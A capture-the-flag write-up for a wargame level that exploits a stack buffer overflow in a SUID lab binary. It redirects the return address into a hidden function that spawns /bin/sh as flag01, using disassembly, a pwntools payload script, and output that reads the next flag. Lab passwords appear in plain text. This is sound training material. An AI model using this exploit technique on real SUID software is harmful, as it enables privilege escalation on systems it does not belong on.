# Level 01

czugaihitjx0lys47blkh0qwtzz1c9g6

## Description

```
$ ls -l
total 28
-rwsr-x--- 1 flag01  level01 16592 Jun  9 23:13 ono
-r--r--r-- 1 level01 level01  1610 Jun  9 23:13 ono.c
-r--r--r-- 1 level01 level01    57 Jun  9 23:13 README
```

- `ono` has SUID so running a shell from it will works

## ono.c

### Buffer overflow

```
...
#define OPERATOR_LEN 64
...
char op_id[OPERATOR_LEN];
...
read(STDIN_FILENO, op_id, 256); // => OVERFLOW
```

The program reads 192 bytes more than the size of destination buffer, meaning we can exploit this buffer overun.

### maintenance_exec func

The code declares a static function `maintenance_exec`, not called from the main but actually present in the executable at address `0x401276`:

```
nm ono | grep maintenance
0000000000401276 t maintenance_exec
```

This function is interesting because it executes a shell after having transferred the effective UID as the real UID (meaning the shell will be started as flag01 even if `-p` argument is not given).

Because this function already exist, we may not have to inject our own shellcode runnning a shell but rather just overrides return address toward this function.

```
 if (code == 0xdeadbeefL) {
    setreuid(geteuid(), geteuid());
    execl("/bin/sh", "sh", NULL);
}
```

#### Issue - if safeguard

Interesting code in the function is only executed if first argument match `0x00000000deadbeef`.

As we have no way to force `$rdi` to the target value, we can skip the beginning of the function by rather setting as return address the start of the interesting code.

Let's disassemble the function to check what options we have :

```
0x0000000000401283 <+13>:	mov    %rdi,-0x18(%rbp)
0x0000000000401287 <+17>:	mov    $0xdeadbeef,%eax
0x000000000040128c <+22>:	cmp    %rax,-0x18(%rbp)
0x0000000000401290 <+26>:	jne    0x4012ca <maintenance_exec+84>
... start of interesting code ...
0x0000000000401292 <+28>:	call   0x401130 <geteuid@plt>
... interesting code ... 
0x00000000004012ca <+84>:	nop => jump adress
0x00000000004012cb <+85>:	mov    -0x8(%rbp),%rbx
0x00000000004012cf <+89>:	leave
```

Any address before `0x401292` will result in a return of the function before running the execve. So we must use `0x401292` as return  address.

### `ONO_` comparison

```
read(STDIN_FILENO, op_id, 256);
...
 if (strncmp(op_id, "ONO_", 4) == 0) {
    // BRANCH 1
} else {
    ...
    // BRANCH 2
    if (ctx.retries == 0) {
        // BRANCH 2.1
        printf("[ONO-SENDAI VII] Max retries exceeded. Shutting down.\n");
        exit(1);
    }
}
```

The 4-first bytes of the input payload are compared against `ONO_`, if not equal there is another comparison in branch 2 that could lead to an `exit()` syscall. An exit syscall would ignore the return address, which is bad for us.

But if we look closely, branch 2.1 will only be reached if `ctx.retries == 0`, which will NEVER occur here, as the `run_diagnostic` function is only ran once and `ctx.retries` is initialized with the value `3`.

It means that the 4-first bytes of the payload actually don't matter. 

## The exploit

### Finding return address offset

At the start of `run_diagnostic` function:
```
=> 0x40139e <run_diagnostic+8>:	sub    $0x40,%rsp
```

The `op_id` buffer is stored at the beginning of the stack frame, that is `$rbp - 0x40`, so the offset between `saved $rip` and start of the buffer is `-0x40 - 0x08 = -0x48`.

As we need to overrides the return address, the injected payload must have a lengh of `0x48 + 0x08 = 0x50` bytes.

### Payload generation

Any data will work for padding, let's use 72 `a` characters, followed by the address `0x401292` in little-endian.

This time we'll use `pwntools` python tool to generate payload.

```
from pwn import *

target_addr = 0x401292

payload = b'a' * 0x48
payload += p64(target_addr, "little")

shell = ssh(host="localhost", port=4242, user="level01", password="czugaihitjx0lys47blkh0qwtzz1c9g6")

shell.upload_data(payload, "/home/level01/payload.bin")
```

This script will generate the payload and copy it directly on the host.

Once in the host, we can try the exploit :

```
(cat payload.bin; cat) | ./ono
```

Output
```
ls
input  ono  ono.c  payload.bin	README
whoami
flag01
cat /home/flag01/.pass
3309s5bx9kagi0z0qt0erxvivievlh86
```